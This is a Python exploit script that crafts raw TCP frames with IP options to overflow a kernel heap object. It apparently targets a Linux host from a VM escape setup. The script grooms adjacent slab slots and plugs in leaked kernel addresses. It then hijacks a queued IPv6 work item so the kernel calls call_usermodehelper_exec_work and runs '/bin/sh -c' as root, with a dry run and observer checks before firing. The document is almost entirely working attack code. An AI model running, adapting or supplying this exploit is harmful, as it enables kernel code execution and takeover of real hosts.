#!/usr/bin/env python3
# r6fire.py -- observer-free dry then fire on the current ELIGIBLE r6 boot.
#
# Payload values are the boot-stable values leaked through the guest-visible
# 255-byte window (NOT taken from the CO-RE observer):
#   pwq      = 0xffff8b25801d9e00
#   poolhead = 0xffff8b28efdb43a8
#   kbase    = 0xffffffff8cc00000
#
# The work that leaked W=0xffff8b2583720840 already executed; a fire needs a
# fresh work in a freed successor slot.  The script therefore builds fresh
# [V][W] pairs on the current active slab and writes into W:
#   RST W -> probe (site N) -> work at W
#   RST V -> overflower dopt at V -> echo V+32=W-32
#   dry  0x4000: 64B header overwrite, func=__x86_return_thunk
#   fire 0xE000: 192B header+subprocess_info, func=call_usermodehelper_exec_work
#
# r6obs is used only to verify QUEUE work==W, ECHO dopt==V, EXEC func.
# No 0xFF00.  Abort on any mismatch.  SCHED_IDLE kworkers + FIFO sender.
import os, re, sys, time, struct, socket, subprocess

DEV = "r6a"; PEER = "r6b"
SRC4 = bytes([192, 168, 250, 114])
DST4 = bytes([192, 168, 250, 1])
LOG = "/tmp/r6new/obs-fire.log"

PWQ = 0xffff8b25801d9e00
PH = 0xffff8b28efdb43a8
KBASE = 0xffffffff8cc00000
RET_OFF = 0x126c330
EXEC_OFF = 0x12ec10
RT6_OFF = 0x10cbfd0


def sh(c, to=30):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)


def ksym(n):
    out = sh("grep -w %s /proc/kallsyms | head -1" % n).stdout.split()
    return int(out[0], 16) if out else 0


def csum(d):
    if len(d) % 2:
        d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d) // 2), d))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def csum_partial(d):
    s = 0; i = 0
    while i + 1 < len(d):
        s += d[i] | (d[i + 1] << 8); i += 2
    if i < len(d):
        s += d[i]
    return s


def csum_fold(s):
    s = (s & 0xffff) + (s >> 16); s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def htons(v):
    return ((v << 8) | (v >> 8)) & 0xffff


def peer_mac():
    try:
        return bytes.fromhex(open("/sys/class/net/%s/address" % PEER).read().strip().replace(":", ""))
    except Exception:
        return b"\xff" * 6


def frame(sport, seq, wire=None, payload=b"\x41" * 64, rst=False):
    hl = 20 if rst else 32
    thlen = 20
    ip = bytearray(hl + thlen + len(payload))
    ip[0] = 0x40 | (hl // 4)
    struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6; ip[12:16] = SRC4; ip[16:20] = DST4
    if not rst:
        ip[20] = 7; ip[21] = 11; ip[22] = 12
        for i in range(23, 31):
            ip[i] = 0x40 + i
        ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4; th[13] = 0x04 if rst else 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    if not rst:
        th[thlen:] = payload
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload))
    struct.pack_into(">H", th, 16, csum(pseudo + bytes(th[:thlen + len(payload)])))
    vhdr = bytearray(10)
    if wire is not None:
        want = htons(wire)
        for w in range(65536):
            ip[25] = w & 0xff; ip[26] = (w >> 8) & 0xff
            if csum_fold(csum_partial(bytes(ip[21:]))) == want:
                break
        struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
        vhdr[0] = 1; struct.pack_into("<H", vhdr, 6, 14 + 21)
    else:
        struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    eth = peer_mac() + bytes.fromhex("020000000002") + struct.pack(">H", 0x0800)
    return bytes(vhdr) + eth + bytes(ip)


def sock():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((DEV, 0))
    s.setsockopt(263, 15, 1)
    return s


def probe6(gw, s6):
    icmp = struct.pack(">BBHHH", 128, 0, 0, 0x1234, 0) + b"R6R6"
    s6.sendto(icmp, ("fd01:0:%x::1" % gw, 0, 0, 0))


def dry_payload():
    p = bytearray(64)
    struct.pack_into("<Q", p, 0, PWQ | 5)
    struct.pack_into("<Q", p, 8, PH)
    struct.pack_into("<Q", p, 16, PH)
    struct.pack_into("<Q", p, 24, KBASE + RET_OFF)
    return bytes(p)


def fire_payload(W):
    p = bytearray(192)
    struct.pack_into("<Q", p, 0, PWQ | 5)
    struct.pack_into("<Q", p, 8, PH)
    struct.pack_into("<Q", p, 16, PH)
    struct.pack_into("<Q", p, 24, KBASE + EXEC_OFF)
    struct.pack_into("<Q", p, 32, 0)
    struct.pack_into("<Q", p, 40, W + 128)
    struct.pack_into("<Q", p, 48, W + 160)
    struct.pack_into("<Q", p, 56, W + 184)
    struct.pack_into("<I", p, 64, 2)
    p[128:136] = b"/bin/sh\0"
    p[136:140] = b"-c\0\0"
    cmd = b"id > /tmp/pwned\0"
    p[140:140 + len(cmd)] = cmd
    struct.pack_into("<4Q", p, 160, W + 128, W + 136, W + 140, 0)
    return bytes(p)


def start_obs(rt6, secs=120):
    os.makedirs("/tmp/r6new", exist_ok=True)
    open(LOG, "w").close()
    obs = subprocess.Popen(["/opt/pwnescape/tools/r6obs", "%x" % rt6, str(secs)],
                           stdout=open(LOG, "w"), stderr=subprocess.STDOUT)
    for _ in range(80):
        if "READY" in open(LOG, errors="ignore").read():
            return obs, True
        time.sleep(0.1)
    return obs, False


def parse_obs():
    q = []; e = []; x = []
    for ln in open(LOG, errors="ignore"):
        p = ln.split()
        if not p:
            continue
        try:
            if p[0] == "QUEUE" and len(p) >= 9:
                q.append(dict(work=int(p[1], 16), pwq=int(p[2], 16), data=int(p[3], 16),
                              next=int(p[4], 16), prev=int(p[5], 16), func=int(p[6], 16),
                              cpu=int(p[7]), ts=int(p[8])))
            elif p[0] == "EXEC" and len(p) >= 5:
                x.append(dict(work=int(p[1], 16), func=int(p[2], 16), cpu=int(p[3]),
                              ts=int(p[4])))
            elif p[0] == "ECHO" and len(p) >= 5:
                e.append(dict(dopt=int(p[1], 16), sport=int(p[2]), cpu=int(p[3]),
                              ts=int(p[4])))
        except Exception:
            pass
    return q, e, x


def setup_gw(gw):
    nhid = 30000 + (gw & 0xffff)
    sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % gw)
    sh("ip nexthop del id %d 2>/dev/null" % nhid)
    r = sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (nhid, gw))
    if r.returncode != 0:
        print("nexthop add failed: %s" % r.stderr.strip(), flush=True)
    sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (gw, nhid))
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % gw)


def set_kworkers_idle():
    kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
    for t in kws:
        sh("chrt -i -p 0 %s 2>/dev/null" % t)
    return kws


def restore_kworkers(kws):
    for t in kws:
        sh("chrt -o -p 0 %s 2>/dev/null" % t)


def run_critical(s, s6, actions):
    old = os.sched_getscheduler(0)
    t0 = time.time()
    try:
        os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(50))
        for kind, arg in actions:
            if kind == "send":
                s.send(arg)
            else:
                probe6(arg, s6)
        dt = (time.time() - t0) * 1e6
    finally:
        os.sched_setscheduler(0, old, os.sched_param(0))
    return dt


def check(q, e, x, W, V, ov_sp, want_func):
    qw = [ev for ev in q if ev["work"] == W]
    ew = [ev for ev in e if ev["sport"] == ov_sp]
    xw = [ev for ev in x if ev["work"] == W]
    ok_q = bool(qw)
    ok_e = bool(ew) and ew[-1]["dopt"] - 16 == V
    ok_x = bool(xw) and xw[-1]["func"] == want_func
    print("  CHECK QUEUE=%s (%s) ECHO=%s (%s) EXEC=%s (%s)" % (
        ok_q, hex(qw[-1]["data"]) if qw else None,
        ok_e, hex(ew[-1]["dopt"]) if ew else None,
        ok_x, hex(xw[-1]["func"]) if xw else None), flush=True)
    return ok_q and ok_e and ok_x


def wait_queue(W, timeout=0.25):
    t0 = time.time()
    while time.time() - t0 < timeout:
        q, e, x = parse_obs()
        if any(ev["work"] == W for ev in q):
            return True
    return False


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 60
    gw_dry = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x7d00
    gw_fire = gw_dry + 1
    rt6 = ksym("rt6_probe_deferred")
    try:
        os.sched_setaffinity(0, {7})
    except Exception as e:
        print("affinity err", e, flush=True)
    print("FIRE-RUN n=%d gw_dry=%#x gw_fire=%#x rt6=%#x" %
          (n, gw_dry, gw_fire, rt6), flush=True)
    print("payload pwq=%#x ph=%#x kbase=%#x" % (PWQ, PH, KBASE), flush=True)
    print("funcs dry=%#x fire=%#x" % (KBASE + RET_OFF, KBASE + EXEC_OFF), flush=True)

    for gw in (gw_dry, gw_fire):
        setup_gw(gw)
    sh("ip neigh replace 192.168.250.114 lladdr 52:54:00:b2:39:e6 dev virbr-pwn nud permanent 2>/dev/null")
    print("aging 11.6s", flush=True)
    time.sleep(11.6)

    sh("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
    time.sleep(0.2)
    obs, ready = start_obs(rt6, 120)
    print("obs_ready=%s" % ready, flush=True)
    if not ready:
        obs.terminate(); return 1

    s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
    s6.bind(("fd00:1::1", 0))
    s = sock()

    base = 55000 + (int(time.time()) % 300)
    seqbase = 0x55000000 + (int(time.time()) & 0xfff) * 256
    sports = set(range(base, base + n))
    for i in range(n):
        s.send(frame(base + i, (seqbase + i) & 0xffffffff))
    time.sleep(0.15)

    q, e, x = parse_obs()
    slots = {ev["sport"]: ev["dopt"] - 16 for ev in e if ev["sport"] in sports}
    if len(slots) < 10:
        print("ABORT too few victims (%d)" % len(slots)); obs.terminate(); return 1
    pages = {}
    for sp, a in slots.items():
        pages.setdefault(a & ~0xfff, []).append((sp, a))
    last = max((ev for ev in e if ev["sport"] in sports), key=lambda ev: ev["ts"])
    page = (last["dopt"] - 16) & ~0xfff
    a2s = {a: sp for sp, a in slots.items()}
    pairs = []
    for sp, a in pages.get(page, []):
        if a + 64 in a2s:
            pairs.append((a, a + 64, sp, a2s[a + 64]))
    pairs.sort(key=lambda p: p[3], reverse=True)
    chosen = []; used = set()
    for p in pairs:
        if p[0] in used or p[1] in used:
            continue
        chosen.append(p); used.add(p[0]); used.add(p[1])
        if len(chosen) >= 2:
            break
    pairs = chosen
    print("victims=%d page=%#x objs=%d pairs=%d" %
          (len(slots), page, len(pages.get(page, [])), len(pairs)), flush=True)
    if len(pairs) < 2:
        print("ABORT need >=2 disjoint adjacent pairs"); obs.terminate(); return 1

    kws = set_kworkers_idle()

    # ---------- DRY ----------
    V, W, sv, sw = pairs[0]
    seqv = (seqbase + (sv - base)) & 0xffffffff
    seqw = (seqbase + (sw - base)) & 0xffffffff
    ov_sp = 48100 + (int(time.time()) % 100)
    fr_w = frame(sw, (seqw + 1) & 0xffffffff, rst=True)
    fr_v = frame(sv, (seqv + 1) & 0xffffffff, rst=True)
    fr_ov = frame(ov_sp, 0x61000000, wire=0x4000, payload=dry_payload())
    print("DRY V=%#x(%d) W=%#x(%d) ovs=%d" % (V, sv, W, sw, ov_sp), flush=True)
    # one FIFO section: the work cannot be dequeued between probe and copy
    dt = run_critical(s, s6, [("send", fr_w), ("probe", gw_dry),
                              ("send", fr_v), ("send", fr_ov)])
    print("  dt=%.0fus" % dt, flush=True)
    time.sleep(0.8)
    q, e, x = parse_obs()
    if not check(q, e, x, W, V, ov_sp, KBASE + RET_OFF):
        print("DRY FAIL -- abort, no fire", flush=True)
        restore_kworkers(kws); obs.terminate(); return 2
    if os.path.exists("/tmp/pwned"):
        print("UNEXPECTED /tmp/pwned after dry", flush=True)
        restore_kworkers(kws); obs.terminate(); return 3
    print("DRY PASS", flush=True)
    dry_ok = True

    # ---------- FIRE ----------
    V2, W2, sv2, sw2 = pairs[1]
    seqv2 = (seqbase + (sv2 - base)) & 0xffffffff
    seqw2 = (seqbase + (sw2 - base)) & 0xffffffff
    ov_sp2 = ov_sp + 1
    fr_w2 = frame(sw2, (seqw2 + 1) & 0xffffffff, rst=True)
    fr_v2 = frame(sv2, (seqv2 + 1) & 0xffffffff, rst=True)
    fr_ov2 = frame(ov_sp2, 0x62000000, wire=0xE000, payload=fire_payload(W2))
    print("FIRE V=%#x(%d) W=%#x(%d) ovs=%d func=%#x" %
          (V2, sv2, W2, sw2, ov_sp2, KBASE + EXEC_OFF), flush=True)
    dt = run_critical(s, s6, [("send", fr_w2), ("probe", gw_fire),
                              ("send", fr_v2), ("send", fr_ov2)])
    print("  dt=%.0fus" % dt, flush=True)
    time.sleep(1.2)
    q, e, x = parse_obs()
    ok = check(q, e, x, W2, V2, ov_sp2, KBASE + EXEC_OFF)
    pwn = os.path.exists("/tmp/pwned")
    print("FIRE check=%s pwned=%s" % (ok, pwn), flush=True)
    if pwn:
        print("== PWND ==", flush=True)
        print(sh("cat /tmp/pwned; id; hostname").stdout, flush=True)
    else:
        print("NO /tmp/pwned", flush=True)
    restore_kworkers(kws)
    obs.terminate()
    return 0 if pwn else 4


if __name__ == "__main__":
    sys.exit(main())
